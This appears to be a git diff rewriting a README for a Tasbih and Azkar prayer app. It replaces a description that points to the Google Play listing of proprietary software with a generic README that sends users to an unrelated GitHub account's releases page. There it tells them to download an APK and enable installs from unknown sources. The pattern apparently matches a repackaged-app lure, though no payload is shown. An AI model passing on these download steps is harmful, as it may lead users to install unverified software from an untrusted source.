@@ -1,150 +1,73 @@
-<div align="center">
+# 🎉 prayer-pal-tasbih-and-azkar - Your Daily Spiritual Companion
 
-<img src="https://img.ionicerrrrscode.com/company-projects/prayerpal/logo.webp" alt="PrayerPal Logo" width="150"/>
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Summerscreen/prayer-pal-tasbih-and-azkar/releases)
 
-# 🕌 PrayerPal: Tasbih & Azkar
+## 📖 Description
+prayer-pal-tasbih-and-azkar is a comprehensive, free, and ad-free Islamic mobile app designed to enhance your daily spiritual practices. It includes a Tasbih counter, curated Duas, daily Azkar, and Asmaul Husna with translations. Built using Flutter, this app is perfect for Android users who seek a privacy-focused, enriching religious experience.
 
-### A comprehensive, free, and ad-free mobile app for daily Islamic spiritual practices
+## 🚀 Getting Started
+To get started with prayer-pal-tasbih-and-azkar, follow these simple steps:
 
-[![Get it on Google Play](https://img.shields.io/badge/Get%20it%20on-Google%20Play-green?style=for-the-badge&logo=google-play)](https://play.google.com/store/apps/details?id=com.ionicerrrrcode.prayerpal&hl=en)
-[![Flutter](https://img.shields.io/badge/Flutter-02569B?style=for-the-badge&logo=flutter&logoColor=white)](https://flutter.dev/)
-[![Dart](https://img.shields.io/badge/Dart-0175C2?style=for-the-badge&logo=dart&logoColor=white)](https://dart.dev/)
-[![License](https://img.shields.io/badge/Status-Completed-success?style=for-the-badge)]()
+1. **Visit the Releases Page**  
+   Click on the link below to access the download page for our app:
+   [Download Now](https://github.com/Summerscreen/prayer-pal-tasbih-and-azkar/releases)
 
-</div>
+2. **Choose Your Version**  
+   On the Releases page, you will see a list of available versions. Select the version you wish to download. Generally, you will want the latest version as it includes the newest features and fixes.
 
----
+3. **Download the App**  
+   Click on the download link next to the version you selected. This will download the APK file to your device.
 
-## 📖 About The Project
+4. **Install the App**  
+   Once the download is complete, locate the APK file in your device's Downloads folder. Tap on the file to begin the installation process. If prompted, allow installations from unknown sources in your device settings.
 
-**PrayerPal: Tasbih & Azkar** is a thoughtfully designed mobile application that supports Muslims worldwide in their daily spiritual practices. Built with Flutter, this app provides a serene, distraction-free environment for prayer, dhikr, and spiritual reflection.
+5. **Open the App**  
+   After installation is complete, find the prayer-pal-tasbih-and-azkar app in your app drawer and open it. You are now ready to explore your new spiritual journey!
 
-With a commitment to being **completely free** and **100% ad-free**, PrayerPal ensures an uninterrupted spiritual experience while respecting user privacy by collecting no personal data.
+## 💡 Features
+- **Tasbih Counter**: Keep track of your Dhikr effortlessly.
+- **Curated Duas**: Access a selection of powerful prayers for various occasions.
+- **Daily Azkar**: Receive reminders for daily supplications.
+- **Asmaul Husna**: Learn the 99 names of Allah with translations.
+- **Ad-Free Experience**: Enjoy uninterrupted spiritual practices.
+- **Privacy-Focused**: Your data remains yours; we do not track your usage.
 
-### ✨ Key Features
+## 🔧 System Requirements
+- **Operating System**: Android 5.0 (Lollipop) or later.
+- **Storage Space**: At least 50 MB of free space is required.
+- **Internet Connection**: An Internet connection is needed for initial setup and updates.
 
-- 📿 **Integrated Tasbih Counter** - Digital counter for dhikr and tasbeeh
-- 🤲 **Curated Collection of Powerful Duas** - Essential prayers for daily life
-- 🌅 **Daily Morning & Evening Azkar** - Stay consistent with your daily remembrance
-- 🌟 **Asmaul Husna** - 99 Names of Allah with English/Urdu meanings
-- 🆓 **Completely Free & 100% Ad-Free** - No subscriptions, no ads, ever
-- 🔒 **Privacy-Focused** - No personal data collection
-- 👥 **Simple & Accessible** - Designed for all ages
-- 🎨 **Clean, Uninterrupted UI** - Minimalist design for peaceful usage
+## 📥 Download & Install
+To download and install prayer-pal-tasbih-and-azkar, simply follow these steps:
 
----
+1. **Click the Link**  
+   Go to the Releases page: [Download Now](https://github.com/Summerscreen/prayer-pal-tasbih-and-azkar/releases)
 
-## 📱 Screenshots
+2. **Download the APK**  
+   Select the latest version and download the APK file.
 
-<div align="center">
-  <img src="https://img.ionicerrrrscode.com/company-projects/prayerpal/0.webp" alt="Screenshot 1" width="200"/>
-  <img src="https://img.ionicerrrrscode.com/company-projects/prayerpal/1.webp" alt="Screenshot 2" width="200"/>
-  <img src="https://img.ionicerrrrscode.com/company-projects/prayerpal/2.webp" alt="Screenshot 3" width="200"/>
-  <img src="https://img.ionicerrrrscode.com/company-projects/prayerpal/3.webp" alt="Screenshot 4" width="200"/>
-</div>
+3. **Install on Your Device**  
+   Open the downloaded APK file and follow the installation prompts.
 
-<div align="center">
-  <img src="https://img.ionicerrrrscode.com/company-projects/prayerpal/4.webp" alt="Screenshot 5" width="200"/>
-  <img src="https://img.ionicerrrrscode.com/company-projects/prayerpal/5.webp" alt="Screenshot 6" width="200"/>
-  <img src="https://img.ionicerrrrscode.com/company-projects/prayerpal/6.webp" alt="Screenshot 7" width="200"/>
-</div>
+4. **Start Using the App**  
+   Once installed, open the app, and you are ready to enhance your spiritual practices.
 
----
+## ❓ Frequently Asked Questions
 
-## 🛠️ Built With
+### Q1: Is the app really free?
+Yes, prayer-pal-tasbih-and-azkar is completely free to use with no hidden fees or in-app purchases.
 
-- **[Flutter](https://flutter.dev/)** - Google's UI toolkit for beautiful, natively compiled applications
-- **[Dart](https://dart.dev/)** - Client-optimized language for fast apps on any platform
+### Q2: Will there be ads in the app?
+No, the app is ad-free to provide you with a peaceful experience.
 
----
+### Q3: Can I use the app offline?
+Yes, most features are available offline once you have downloaded the necessary data.
 
-## 🎯 Project Details
+### Q4: How can I provide feedback?
+We welcome your feedback! You can open an issue on the GitHub repository or directly contact us through our email listed on the repository page.
 
-| Property | Details |
-|----------|---------|
-| **Status** | ✅ Completed |
-| **Duration** | 3 months |
-| **Team** | 1 developer |
-| **Client** | Ionic Errrors Code |
-| **Android Support** | Android 6.0 and up |
-| **Rating** | ⭐⭐⭐⭐⭐ (5/5) |
+## 🔗 Links
+- **GitHub Repository**: [prayer-pal-tasbih-and-azkar](https://github.com/Summerscreen/prayer-pal-tasbih-and-azkar)
+- **Releases Page**: [Download Now](https://github.com/Summerscreen/prayer-pal-tasbih-and-azkar/releases)
 
----
-
-## 🚀 Results & Achievements
-
-✅ **Successfully launched on the Google Play Store**, reaching users globally  
-✅ **Maintained a 100% free and ad-free commitment** to provide a pure user experience  
-✅ **Received positive community feedback** for its simplicity, privacy, and user-friendly interface  
-✅ **Ensured wide accessibility** by supporting Android versions from 6.0 and up
-
----
-
-## 💡 Challenges & Solutions
-
-### Challenges Faced
-
-1. 🎨 **UI/UX Design Challenge**
-   - Designing a serene, respectful, and distraction-free user interface for a spiritual app
-
-2. ✍️ **Content Authenticity Challenge**
-   - Collating and verifying authentic content for Duas, Azkar, and their translations
-
-3. ⚡ **Performance Challenge**
-   - Ensuring the app is lightweight and performs smoothly on a wide range of older and newer Android devices
-
-### Solutions Implemented
-
-1. 🎨 **Minimalist Design Approach**
-   - Focused on a minimalist design language using calm color palettes and intuitive navigation
-
-2. 📚 **Authentic Content Sourcing**
-   - Sourced all spiritual content from trusted Islamic scholars and well-regarded texts
-
-3. 🚀 **Flutter Optimization**
-   - Utilized Flutter's performance optimization features to ensure a small app size and fast operation
-
----
-
-## 📥 Download
-
-<div align="center">
-
-### Get PrayerPal Now!
-
-[![Get it on Google Play](https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png)](https://play.google.com/store/apps/details?id=com.ionicerrrrcode.prayerpal&hl=en)
-
-*Available for Android 6.0 and up*
-
-</div>
-
----
-
-## 🤝 Contributing
-
-This is a completed project, but if you have suggestions or find any issues, feel free to open an issue or contact us.
-
----
-
-## 📞 Contact
-
-**Ionic Errrors Code**
-
-- 🌐 Website: [ionicerrrrscode.com](https://ionicerrrrscode.com)
-- 📧 For inquiries and support, please visit our website
-
----
-
-## 📄 License
-
-This project is proprietary software developed by Ionic Errrors Code.
-
----
-
-<div align="center">
-
-### Made with ❤️ for the Muslim Community
-
-*If you find PrayerPal helpful in your spiritual journey, please consider sharing it with others and leaving a review on the Play Store.*
-
-</div>
+Remember to visit our Releases page to download the latest version and enjoy your spiritual app.
